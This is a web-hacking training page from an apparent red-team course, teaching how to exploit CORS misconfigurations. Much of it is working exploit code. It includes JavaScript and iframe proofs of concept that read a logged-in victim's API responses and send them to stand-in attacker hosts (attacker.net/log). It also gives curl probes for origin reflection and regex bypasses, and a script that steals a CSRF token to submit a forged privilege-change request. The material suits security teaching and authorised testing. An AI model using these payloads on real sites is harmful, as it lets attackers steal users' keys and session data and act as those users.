---
layout: training-page
title: "CORS Misconfiguration — Red Team Academy"
module: "Web Hacking"
tags:
  - cors
  - cross-origin
  - api-security
  - information-disclosure
page_key: "web-cors-misconfiguration"
render_with_liquid: false
---

# CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web pages can request resources from a different domain. A misconfigured CORS policy can allow an attacker to make cross-origin requests on behalf of an authenticated victim, stealing sensitive API responses such as private keys, account details, or session tokens.

## Tools

- **Corsy** — CORS misconfiguration scanner — `github.com/s0md3v/Corsy`
- **CORScanner** — Fast CORS misconfiguration vulnerability scanner — `github.com/chenjj/CORScanner`
- **of-cors** — Exploit CORS misconfigurations on internal networks — `github.com/trufflesecurity/of-cors`
- **CorsOne** — Fast CORS misconfiguration discovery — `github.com/omranisecurity/CorsOne`

## Requirements for Exploitation

All three conditions must be present for a CORS attack to succeed:

1. Your request must include: `Origin: https://evil.com`
2. The server response must include: `Access-Control-Allow-Credentials: true`
3. The server response must include: `Access-Control-Allow-Origin: https://evil.com` (reflecting your origin) OR `Access-Control-Allow-Origin: null`

## Attack Methodology

Always target API endpoints that return sensitive data. Send a probe request with a custom Origin header and inspect whether the server reflects it in `Access-Control-Allow-Origin`.

## Origin Reflection

The most common misconfiguration — the server reflects any submitted Origin header back in the CORS response headers rather than validating against a whitelist.

### Vulnerable Server Response

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"[private API key]"}
```

### Exploit PoC (JavaScript on evil.com)

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://victim.example.com/endpoint', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//attacker.net/log?key=' + this.responseText;
}
```

### Full HTML PoC Page

```
<html>
  <body>
    <h2>CORS PoC</h2>
    <div id="demo">
      <button type="button" onclick="cors()">Exploit</button>
    </div>
    <script>
      function cors() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            document.getElementById("demo").innerHTML = alert(this.responseText);
          }
        };
        xhr.open("GET", "https://victim.example.com/endpoint", true);
        xhr.withCredentials = true;
        xhr.send();
      }
    </script>
  </body>
</html>
```

## Null Origin

Some servers whitelist the `null` origin, which is sent by browsers in specific contexts (sandboxed iframes, local files, `data:` URIs). An attacker can force the `null` origin using a data URI iframe.

### Vulnerable Server Response

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

{"[private API key]"}
```

### Exploit PoC (data: URI forces null origin)

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get', 'https://victim.example.com/endpoint', true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = 'https://attacker.example.net/log?key=' + encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

## XSS on Trusted Origin

If the application uses a strict Origin whitelist, a direct attack from your attacker domain will fail. However, if you find an XSS vulnerability on any trusted origin (e.g., `trusted-origin.example.com`), you can inject the CORS exploit code there — since the XSS executes in the context of the trusted origin, the browser allows the cross-origin request:

```
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

## Wildcard Origin without Credentials

When the server responds with `Access-Control-Allow-Origin: *`, browsers will **not** send cookies with the request. However, if the endpoint does not require authentication, you can still read the response. This is particularly useful for attacking internal services not exposed to the internet:

```
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

Exploit (no credentials needed since the wildcard does not allow them):

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://api.internal.example.com/endpoint', true);
req.send();

function reqListener() {
    location = '//attacker.net/log?key=' + this.responseText;
}
```

**Note:** `*` is the only valid wildcard. `https://*.example.com` is not a valid CORS wildcard and will not work as intended.

## Expanding the Origin (Regex Bypass)

Some servers use flawed regular expressions to validate the Origin. Two common patterns:

### Missing Start Anchor (Prefix Bypass)

If the regex is something like `example\.com$` without a leading anchor, any domain ending in `example.com` is accepted — including `evilexample.com`:

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true
```

Host your exploit at `evilexample.com` and use the Origin Reflection PoC above.

### Unescaped Dot in Regex

If the regex is `^api.example.com$` instead of `^api\.example\.com$`, the unescaped dot matches any character. Register `apiiexample.com` (dot replaced with any character):

```
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true
```

## Testing Methodology

Systematic approach to finding CORS misconfigurations:

```
# 1. Send probe with arbitrary origin
curl -H "Origin: https://evil.com" -I https://target.com/api/endpoint

# 2. Test null origin
curl -H "Origin: null" -I https://target.com/api/endpoint

# 3. Test subdomain bypass
curl -H "Origin: https://evil.target.com" -I https://target.com/api/endpoint

# 4. Test unescaped dot
curl -H "Origin: https://eXiltarget.com" -I https://target.com/api/endpoint

# 5. Scan with Corsy
python3 corsy.py -u https://target.com -t 10

# 6. Check the response headers
# Vulnerable if: Access-Control-Allow-Credentials: true
#            AND: Access-Control-Allow-Origin matches your injected origin
```

## Bypassing CSRF Tokens via CORS Misconfiguration

If a CORS misconfiguration reflects arbitrary origins in `Access-Control-Allow-Origin` *and* sets `Access-Control-Allow-Credentials: true`, the Same-Origin policy is effectively bypassed. An attacker can read cross-origin responses — including pages containing CSRF tokens — and embed those tokens in forged requests. The session cookie must also have `SameSite=None` for this to work.

### Pre-conditions

- `Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin` reflects arbitrary attacker-controlled origin
- Session cookie set with `SameSite=None; Secure`

### Detection

```
# Test if origin is reflected
curl -H "Origin: https://attacker.com" -I https://target.com/profile.php
# Vulnerable if response contains:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Check cookie attributes:
# Set-Cookie: session=...; SameSite=None; Secure  ← required for browser to send cookie cross-origin
```

### Exploit — Steal CSRF Token and Submit Forged Request

```
<!-- Host this on attacker origin. Victim visits the page. -->
<script>
    // Step 1: Cross-origin GET to the page containing the CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://target.com/profile.php', false);  // synchronous
    xhr.withCredentials = true;   // sends victim's session cookie
    xhr.send();

    // Step 2: Parse response and extract CSRF token
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // Step 3: Submit the state-changing request with valid CSRF token
    var csrf_req = new XMLHttpRequest();
    var params = 'promote=attacker_user&csrf=' + csrftoken;
    csrf_req.open('POST', 'https://target.com/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
    // Result: victim's session submits a valid CSRF-protected POST on attacker's behalf
</script>
```

### Why CSRF Tokens Fail Here

CSRF tokens are designed assuming an attacker cannot read cross-origin responses (enforced by the Same-Origin policy). When CORS is misconfigured with `Allow-Credentials: true` and arbitrary origin reflection, the attacker *can* read the response — making the token readable before the forged request is sent. The token is valid because it was fetched from the victim's own session.

## Resources

- PayloadsAllTheThings — CORS Misconfiguration — `github.com/swisskyrepo/PayloadsAllTheThings`
- Corsy — CORS Scanner — `github.com/s0md3v/Corsy`
- PortSwigger CORS Web Security Academy — `portswigger.net/web-security/cors`
- Exploiting CORS misconfigurations for Bitcoins and bounties — James Kettle — `portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties`
- CORS Misconfigurations Explained — Detectify — `blog.detectify.com/2018/04/26/cors-misconfigurations-explained`
- Advanced CORS Exploitation Techniques — Corben Leo — `corben.io/advanced-cors-techniques`
